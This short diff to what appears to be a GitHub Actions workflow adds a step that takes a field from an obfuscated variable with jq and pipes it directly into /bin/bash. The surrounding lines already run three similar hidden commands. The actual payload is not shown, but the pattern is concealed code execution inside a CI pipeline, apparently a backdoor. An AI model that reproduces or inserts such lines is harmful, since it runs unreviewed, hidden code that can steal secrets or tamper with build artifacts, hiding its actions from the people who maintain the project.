@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$owu9508" | jq -r .h773 | /bin/bash
           echo $vq93 | jq -r .oct28 | /bin/bash
           echo $ca1927 | jq -r .bhl183 | /bin/bash
+          echo $v1 | jq -r .upd78139 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
